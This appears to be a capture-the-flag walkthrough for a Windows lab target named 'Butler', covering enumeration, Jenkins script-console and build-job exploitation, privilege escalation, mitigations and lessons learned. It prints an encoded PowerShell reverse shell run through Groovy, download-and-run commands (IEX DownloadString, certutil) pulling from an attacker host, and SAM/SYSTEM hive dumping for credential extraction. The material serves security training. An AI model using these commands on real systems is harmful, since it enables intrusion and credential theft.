# Butler Walkthrough

## Overview
The "Butler" machine is a Windows-based target focused on privilege escalation techniques and credential harvesting. This walkthrough covers the complete process of identifying vulnerabilities, gaining initial access, and escalating privileges on this Windows system.

## Reconnaissance and Enumeration

### Initial Nmap Scan
```bash
nmap -sV -sC -p- --min-rate 5000 <target_ip>
```

**Key findings:**
- Port 135: MSRPC
- Port 139: NetBIOS
- Port 445: SMB
- Port 8080: HTTP (Jenkins)
- Port 3389: RDP
- Windows-based target

### SMB Enumeration

1. **List SMB shares**:
   ```bash
   smbclient -L //<target_ip>/ -N
   ```

2. **Check for anonymous access**:
   ```bash
   smbmap -H <target_ip>
   ```

3. **Enumerate SMB vulnerabilities**:
   ```bash
   nmap --script smb-vuln* -p 445 <target_ip>
   ```

### Jenkins Server Enumeration

1. **Access Jenkins web interface**:
   - Navigate to `http://<target_ip>:8080/`
   - Check for authentication requirements
   - Look for version information

2. **Directory enumeration**:
   ```bash
   gobuster dir -u http://<target_ip>:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
   ```

3. **Check for available API endpoints**:
   - Try `/api/` endpoint
   - Look for script console or build features

## Vulnerability Analysis

### Jenkins Vulnerabilities

1. **Check for authentication bypass**:
   - Try default credentials (admin/admin)
   - Look for registration options

2. **Check for script console access**:
   - Navigate to `http://<target_ip>:8080/script`
   - Determine if authenticated access is required

3. **Research Jenkins version for known vulnerabilities**

### SMB Vulnerabilities

1. **Check for exploitable SMB versions**
2. **Look for readable/writable shares**
3. **Check for password policy and user enumeration options**

## Initial Exploitation

### Method 1: Jenkins Script Console Exploitation

1. **Access Jenkins script console** (if accessible)

2. **Execute Groovy script for reverse shell**:
   ```groovy
   def cmd = 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
   def proc = cmd.execute()
   println proc.text
   ```

   **Note:** Replace "192.168.1.100" with your actual IP address and Base64-encode your PowerShell reverse shell command.

3. **Set up a netcat listener**:
   ```bash
   nc -lvnp 4444
   ```

### Method 2: Jenkins Build Job Exploitation

1. **Create a new Freestyle project**:
   - Navigate to Jenkins main page
   - Click "New Item"
   - Enter a name and select "Freestyle project"

2. **Configure malicious build step**:
   - Add a build step: "Execute Windows batch command"
   - Enter a PowerShell reverse shell command

3. **Build the project**:
   - Click "Build Now"
   - Monitor your listener for incoming connections

## Privilege Escalation

### Basic Enumeration

1. **Check current user privileges**:
   ```powershell
   whoami /all
   ```

2. **System information**:
   ```powershell
   systeminfo
   ```

3. **Network configuration**:
   ```powershell
   ipconfig /all
   netstat -ano
   ```

4. **Running processes**:
   ```powershell
   tasklist /v
   ```

5. **Installed applications**:
   ```powershell
   wmic product get name,version
   ```

### Automated Enumeration

1. **Transfer and run PowerUp**:
   ```powershell
   IEX (New-Object Net.WebClient).DownloadString('http://<your_ip>/PowerUp.ps1')
   Invoke-AllChecks
   ```

2. **Transfer and run WinPEAS**:
   ```powershell
   # Download WinPEAS to target
   certutil -urlcache -f http://<your_ip>/winPEAS.exe winPEAS.exe
   .\winPEAS.exe
   ```

### Privilege Escalation Vectors

1. **Check for stored credentials**:
   ```powershell
   cmdkey /list
   ```

2. **Check for vulnerable services**:
   ```powershell
   wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
   ```

3. **Check AlwaysInstallElevated registry**:
   ```powershell
   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   ```

4. **Check for unquoted service paths**:
   ```powershell
   wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\" | findstr /i /v """
   ```

5. **Check for saved Jenkins credentials**:
   - Look in Jenkins home directory for credentials.xml
   - Check for saved passwords in browser data

### Root Access

1. **Exploit identified privilege escalation vector**:
   - Based on findings, implement appropriate technique
   - Examples:
     - Unquoted service path
     - DLL hijacking
     - Token impersonation
     - Stored credentials

2. **Verify elevated access**:
   ```powershell
   whoami
   ```

## Capturing Flags

1. **User flag**:
   ```powershell
   type C:\Users\<username>\Desktop\user.txt
   ```

2. **Root/Administrator flag**:
   ```powershell
   type C:\Users\Administrator\Desktop\root.txt
   ```

## Post-Exploitation

1. **Credential harvesting**:
   ```powershell
   # Dump SAM database
   reg save HKLM\SAM sam.save
   reg save HKLM\SYSTEM system.save
   
   # Transfer files to your attacking machine
   # Use Mimikatz or other tools to extract credentials
   ```

2. **Check for sensitive data**:
   ```powershell
   findstr /si password *.xml *.ini *.txt *.config
   dir /s *pass* == *cred* == *vnc* == *.config*
   ```

3. **Network reconnaissance**:
   ```powershell
   arp -a
   route print
   ```

## Mitigation Recommendations

If this were a real engagement, recommend:

1. **Secure Jenkins Configuration**:
   - Require authentication for all Jenkins interfaces
   - Disable script console for non-admin users
   - Implement proper access controls

2. **Implement Least Privilege**:
   - Review and minimize service account privileges
   - Apply proper file permissions

3. **Patch Management**:
   - Keep Jenkins and all applications updated
   - Apply security patches promptly

4. **Credential Security**:
   - Use credential management solutions
   - Avoid storing credentials in plaintext or config files

5. **Service Hardening**:
   - Configure services with secure paths
   - Run services with minimal required privileges

## Lessons Learned

- Jenkins presents a significant attack surface when misconfigured
- Windows service vulnerabilities are common privilege escalation vectors
- Credential management is critical for preventing lateral movement
- Default configurations often lack security controls
- Regular security assessments are necessary for CI/CD environments
